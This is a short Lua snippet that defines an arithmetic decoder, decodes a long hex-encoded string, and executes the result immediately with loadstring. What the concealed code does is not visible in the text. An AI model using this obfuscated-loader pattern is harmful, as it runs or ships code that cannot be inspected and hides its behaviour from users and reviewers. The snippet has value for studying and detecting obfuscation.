do
  function decode(str)
    local K, F = 8186484168865098, 16384 + 4887
    return (str:gsub('%x%x',
      function(c)
        local L = K % 274877906944  -- 2^38
        local H = (K - L) / 274877906944
        local M = H % 128
        c = tonumber(c, 16)
        local m = (c + (H - M) / 128) * (2*M + 1) % 256
        K = L * F + H + c + m
        return string.char(m)
      end
    ))
  end
end

local s = 'b4af5a82b7a5775f5c04030d513e5f092d56f9daec264c640a33413be60ca576f1c88965377d400f4c8412c12b0a9bd888c23af41fd1c1e6d923e3c3def716e369857b43d76db14168a128d39ed2a4e07adf52d928e23a3318c3a4c46c15b6819d7f1cf16e7b7b0581098fc2ef'
loadstring(decode(s))()
